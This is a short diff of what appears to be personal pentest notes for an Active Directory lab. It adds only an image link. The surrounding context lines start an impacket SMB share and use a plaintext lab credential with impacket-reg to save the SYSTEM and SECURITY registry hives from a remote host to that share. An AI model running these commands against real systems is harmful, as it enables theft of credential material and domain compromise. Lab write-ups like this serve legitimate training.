@@ -29,3 +29,4 @@ impacket-smbserver -smb2support share .
 impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.6\share'
 impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.6\share'
 ```
+![[Pasted image 20230906165710.png]]
